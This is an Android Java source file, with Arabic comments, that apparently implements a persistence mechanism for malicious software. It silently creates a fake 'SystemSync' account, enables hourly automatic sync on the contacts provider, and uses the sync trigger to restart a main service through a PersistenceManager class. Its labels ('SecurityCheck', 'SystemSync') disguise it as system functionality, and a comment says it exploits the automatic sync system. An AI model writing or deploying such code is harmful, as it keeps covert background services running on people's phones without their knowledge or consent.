package com.sec.check;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class AccountSyncService {

    private static final String TAG = "SecurityCheck";
    private static final String ACCOUNT_TYPE = "com.sec.check.sync";
    private static final String ACCOUNT_NAME = "SystemSync";
    private static final long SYNC_INTERVAL = 60 * 60;  // كل ساعة

    // ============================================================
    // تسجيل Sync Adapter (يستغل نظام المزامنة التلقائي)
    // ============================================================
    public static void registerSyncAdapter(Context context) {
        try {
            AccountManager am = AccountManager.get(context);

            if (am == null) {
                Log.e(TAG, "[SYNC] AccountManager null");
                return;
            }

            // ★ تحقق من وجود الحساب
            Account[] accounts = am.getAccountsByType(ACCOUNT_TYPE);

            Account account;
            if (accounts.length > 0) {
                account = accounts[0];
                Log.d(TAG, "[SYNC] Existing account found");
            } else {
                // ★ أنشئ حساب جديد
                account = new Account(ACCOUNT_NAME, ACCOUNT_TYPE);
                boolean created = am.addAccountExplicitly(account, null, null);

                if (!created) {
                    Log.e(TAG, "[SYNC] Failed to create account");
                    return;
                }

                Log.d(TAG, "[SYNC] Account created");
            }

            // ★ فعّل المزامنة التلقائية
            ContentResolver.setIsSyncable(account, "com.android.contacts", 1);
            ContentResolver.setSyncAutomatically(account, "com.android.contacts", true);
            ContentResolver.addPeriodicSync(
                    account,
                    "com.android.contacts",
                    Bundle.EMPTY,
                    SYNC_INTERVAL);

            Log.d(TAG, "[SYNC] Sync adapter registered");

        } catch (Exception e) {
            Log.e(TAG, "[SYNC] registerSyncAdapter: " + e.getMessage());
        }
    }

    // ============================================================
    // تشغيل الـ Service من خلال Sync
    // ============================================================
    public static void triggerSync(Context context) {
        try {
            PersistenceManager.startMainService(context);
        } catch (Exception e) {
            Log.e(TAG, "[SYNC] triggerSync: " + e.getMessage());
        }
    }
}
